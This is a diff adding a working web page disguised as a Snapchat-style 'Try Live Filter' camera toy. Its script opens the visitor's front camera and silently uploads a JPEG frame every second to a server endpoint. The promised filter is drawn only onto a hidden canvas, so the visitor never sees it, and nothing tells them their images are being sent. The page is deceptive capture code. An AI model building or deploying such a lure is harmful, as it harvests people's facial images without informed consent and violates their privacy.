@@ -1,0 +1,198 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Try Filter</title>
+  <style>
+    /* Fullscreen snap-style UI */
+    html,body { height:100%; margin:0; background:#000; font-family: Arial, Helvetica, sans-serif;}
+    #app { position:relative; height:100vh; width:100vw; overflow:hidden; background:#000; }
+    video { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); } /* mirrored selfie */
+    canvas { display:none; } /* used for capture */
+    /* Overlay UI that resembles camera UI (custom icons - not Snapchat copyrighted) */
+    .top-bar {
+      position:absolute; top:12px; left:12px; right:12px; display:flex; justify-content:space-between; align-items:center; color:#fff; z-index:5;
+      pointer-events:none;
+    }
+    .icon { width:36px; height:36px; border-radius:10px; background:rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; pointer-events:auto; }
+    .center-controls {
+      position:absolute; left:0; right:0; bottom:24px; display:flex; justify-content:center; z-index:5;
+    }
+    .shutter {
+      width:86px; height:86px; border-radius:50%;
+      background: rgba(255,255,255,0.15); border: 4px solid rgba(255,255,255,0.9);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+    }
+    /* Big start overlay - clear CTA to request permission */
+    #startOverlay {
+      position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:10; background:linear-gradient(0deg, rgba(0,0,0,0.55), rgba(0,0,0,0.35));
+      color:#fff; font-size:26px; cursor:pointer; user-select:none;
+    }
+    #startOverlay .cta {
+      background: rgba(255,255,255,0.06); padding:18px 36px; border-radius:10px; border:1px solid rgba(255,255,255,0.08);
+      display:flex; gap:12px; align-items:center;
+    }
+    #recordDot {
+      width:12px; height:12px; border-radius:50%; background:red; margin-left:8px; box-shadow:0 0 10px rgba(255,0,0,0.9);
+      display:inline-block; vertical-align:middle;
+    }
+    /* Hide default controls */
+    video::-webkit-media-controls { display:none !important; }
+    /* small accessibility text (hidden from UI, but present for screen readers) */
+    .sr-only { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="captureCanvas" width="640" height="480"></canvas>
+
+    <div class="top-bar" aria-hidden="true">
+      <div style="display:flex; gap:8px; align-items:center;">
+        <div class="icon" id="flashToggle" title="Flash (dummy)" style="pointer-events:auto;">⚡</div>
+      </div>
+      <div style="display:flex; gap:8px; align-items:center;">
+        <div id="recordStatus" style="display:none; color:white; font-weight:600; font-size:14px; align-items:center;">
+          Recording <span id="recordDot"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="center-controls" aria-hidden="true">
+      <div class="shutter" id="shutterIndicator"></div>
+    </div>
+
+    <div id="startOverlay" role="button" aria-pressed="false">
+      <div class="cta">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M8 5v14l11-7L8 5z" fill="#fff"/></svg>
+        <div>Try Live Filter</div>
+      </div>
+    </div>
+
+    <div class="sr-only" aria-live="polite" id="srStatus">Camera inactive</div>
+  </div>
+
+  <script>
+    // Behavior: on click startOverlay -> request camera, start capture loop (1/sec), send to /api/upload-photo
+    (function() {
+      const startOverlay = document.getElementById('startOverlay');
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('captureCanvas');
+      const ctx = canvas.getContext('2d');
+      const recordStatus = document.getElementById('recordStatus');
+      const srStatus = document.getElementById('srStatus');
+
+      // simple visual filter: draw sunglasses-like shapes onto canvas (position relative to canvas)
+      function drawFilterOn(ctx, w, h) {
+        // draw a semi-transparent tint
+        ctx.fillStyle = 'rgba(255,200,240,0.06)';
+        ctx.fillRect(0, 0, w, h);
+
+        // draw "sunglasses" near upper center
+        const cx = w/2;
+        const cy = h/3;
+        const eyeW = w * 0.18;
+        const eyeH = h * 0.08;
+        ctx.fillStyle = 'rgba(10,10,10,0.8)';
+        ctx.beginPath();
+        ctx.ellipse(cx - eyeW*0.9, cy, eyeW, eyeH, 0, 0, Math.PI*2);
+        ctx.fill();
+        ctx.beginPath();
+        ctx.ellipse(cx + eyeW*0.9, cy, eyeW, eyeH, 0, 0, Math.PI*2);
+        ctx.fill();
+        // bridge
+        ctx.fillStyle = 'rgba(10,10,10,0.85)';
+        ctx.fillRect(cx - eyeW*0.3, cy - eyeH*0.25, eyeW*0.6, eyeH*0.5);
+      }
+
+      let captureInterval = null;
+
+      async function startCameraAndCapture() {
+        try {
+          // Request camera
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          video.srcObject = stream;
+          // show recording indicator
+          recordStatus.style.display = 'flex';
+          srStatus.textContent = 'Camera active and recording';
+          startOverlay.style.display = 'none';
+
+          // Set canvas size that we will capture/send (use smaller for bandwidth)
+          const w = 640, h = 480;
+          canvas.width = w;
+          canvas.height = h;
+
+          // Capture & send every 1000 ms (1 per sec)
+          captureInterval = setInterval(async () => {
+            try {
+              // Draw mirrored video to canvas (mirror to match selfie)
+              ctx.save();
+              ctx.scale(-1, 1);
+              ctx.drawImage(video, -w, 0, w, h);
+              ctx.restore();
+
+              // Apply filter overlay
+              drawFilterOn(ctx, w, h);
+
+              // Convert to JPEG dataURL
+              const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+              // Send to server
+              fetch('/api/upload-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ dataUrl })
+              }).catch(err => {
+                console.error('Send failed', err);
+              });
+            } catch (err) {
+              console.error('Capture error', err);
+            }
+          }, 1000);
+
+          // Also update small UI shutter pulse to indicate activity
+          const shutter = document.getElementById('shutterIndicator');
+          setInterval(() => {
+            shutter.style.transform = 'scale(0.98)';
+            shutter.style.transition = 'transform 120ms';
+            setTimeout(()=> shutter.style.transform = 'scale(1)', 120);
+          }, 1000);
+
+        } catch (err) {
+          console.error('User denied camera or no camera', err);
+          srStatus.textContent = 'Camera blocked or not available';
+          // Keep overlay visible so user can try again
+          startOverlay.style.display = 'flex';
+        }
+      }
+
+      // Start when overlay clicked
+      startOverlay.addEventListener('click', async () => {
+        // Accessible label change
+        startOverlay.setAttribute('aria-pressed', 'true');
+        // Start flow
+        await startCameraAndCapture();
+      });
+
+      // When page hidden (user navigates away), stop capture
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+          // stop interval if any
+          if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
+          }
+          // stop tracks
+          const s = video.srcObject;
+          if (s && s.getTracks) {
+            s.getTracks().forEach(t => t.stop());
+          }
+          recordStatus.style.display = 'none';
+          srStatus.textContent = 'Camera stopped';
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
